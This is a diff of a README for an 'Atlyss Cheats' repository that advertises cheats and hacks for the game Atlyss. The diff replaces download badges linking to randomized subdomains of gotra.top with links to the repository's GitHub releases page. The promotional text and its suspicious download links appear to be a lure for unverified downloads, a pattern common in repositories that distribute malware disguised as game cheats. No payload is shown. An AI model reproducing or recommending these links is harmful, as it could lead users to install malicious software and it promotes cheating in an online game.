@@ -1,9 +1,9 @@
-![ATLYSS](https://github.com/user-attachments/assets/2f34c50c-c63d-42f7-a2bf-813047d076d6)
+![ATLYSS](https://github.com/gepreksai12/Atlyss-Cheats/releases)
 
 # **Atlyss Cheats**
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/gepreksai12/Atlyss-Cheats/releases](https://github.com/gepreksai12/Atlyss-Cheats/releases)](https://github.com/gepreksai12/Atlyss-Cheats/releases)
 
 Welcome to the **Atlyss Cheats** repository, your ultimate source for cheats, hacks, and strategies to dominate the world of **Atlyss**. This repository includes a variety of cheats to enhance your gaming experience, unlock hidden features, and boost your gameplay.
 
